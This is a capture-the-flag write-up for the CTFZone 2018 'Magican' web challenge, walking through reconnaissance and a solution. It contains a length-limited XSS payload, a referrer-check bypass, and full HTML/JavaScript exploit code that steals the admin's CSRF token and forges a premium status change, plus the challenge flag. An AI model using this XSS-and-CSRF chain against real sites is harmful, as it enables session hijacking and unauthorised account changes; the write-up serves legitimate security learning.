# Magican &ndash; write-up by @terjanq
*CTFZone 2018 Quals, 7/24/18*

## Description
We are provided with a simple website  
![website]

and the only functionalities are `login/register`, `edit profile`, `support`. 

`Support` section allows us to send two types of messages to the admin: `Problems with Profile` and `Get premium account`. Each of them contains two fields: `Link to profile` and `Message`.  
![support]

`Edit profile` section allows us to edit our name.  
![profile]

## Quick research
- When we manually edit the `Link to profile` field to `http://ourwebsite` in the first option of `Support` section the admin will visit it and thanks to the `User-Agent header` we could see that the admin is using `Firefox 61.0`.  

- `HTTP response header` looks like:
```
< Content-Security-Policy: style-src 'self' 'unsafe-inline'; script-src 'self' 'unsafe-inline' https://www.google.com/recaptcha/ https://www.gstatic.com/recaptcha/;
< Content-Type: text/html; charset=UTF-8
< Referrer-Policy: origin
< Server: Apache/2.4.25 (Debian)
< X-Content-Type-Options: nosniff
< X-Frame-Options: ALLOW-FROM http://web-04.v7frkwrfyhsjtbpfcppnu.ctfz.one
< X-Powered-By: PHP/7.0.30
< X-XSS-Protection: 1; mode=block
```
and means that
    - we cannot include any external `scripts` and `styles`
    - we cannot embed the website into `iframe` on external website (however Google will allow it due to the *incorrect header*)
    - any attempt of `reflected XSS` should be blocked by the browser
    - we can send information out as the `image` or `xhr requests`
     
- Parameter `uuid` in the request `http://web-04.v7frkwrfyhsjtbpfcppnu.ctfz.one/profile.php?uuid=<uuid>` is vulnerable to the injections ( XSS/CSS ) and is limited to `36 characters`. The lack of `XSS Auditor` in Firefox allows us to inject `XSS` in there.  
    ![xss]

- With the help of dirbuster, I found the `manage.php` page which is the admin's tool for changing `user status` to `premium`  
![manage]

- `profile.php` and `manage.php` are protected by the `hidden token`, and tokens are associated with the current session

- When we try to send `POST` data to the `profile.php` or `manage.php` with `Referrer` different than `web-04.v7frkwrfyhsjtbpfcppnu.ctfz.one` the error `Wrong Referrer` will appear. However, I found out that it only has to start with it and therefore the referrer `web-04.v7frkwrfyhsjtbpfcppnu.ctfz.one.example.com` will be accepted!.

- When we try to change our status to `premium`, `Permission Denied!` appears.

## Solution

Based on the findings it was obvious that our goal is to do a `CSRF` (Cross-Origin Request Forgery) attack, in order to change our status to `premium`, and the only missing piece is the `token`. It was a very tough task to steal and then send the token in `36 bytes`! With the help of [@gros] from my team we managed to create a payload `"><svg/onload=$.globalEval(name)` 32 bytes long where `name` is just a short form of `window.name` property. We assigned it by sending the admin to our webpage where we triggered `window.open('http://web-04.v7frkwrfyhsjtbpfcppnu.ctfz.one/profile.php?uuid="><svg/onload=$.globalEval(name)', <long payload>)` setting `window.name` to `<long payload>`.  
    The complete [forms.html] looked like:  
```HTML
<script>

      window.open('http://web-04.v7frkwrfyhsjtbpfcppnu.ctfz.one/profile.php?uuid="><svg/onload=$.globalEval(name)', `

        $.get("manage.php", function(data){    
                var x = /name="token" value="([^"]+)/.exec(data);
                $.post("manage.php", {user_uuid: "6c1e8255-ceed-428a-8b48-74e13db8142d", token: x[1], status: "premium"}); 
         });

   `);

</script>
```
And after sending the admin to that page, on my profile I could find the flag: **ctfzone{0190af5705a38115cd6dee6e7d79e317}**





[website]: <./images/website.png>
[xss]: <./images/xss.png>
[profile]: <./images/profile.png>
[support]: <./images/support.png>
[manage]: <./images/manage.png>
[forms.html]: <./forms.html>
[@gros]: <#>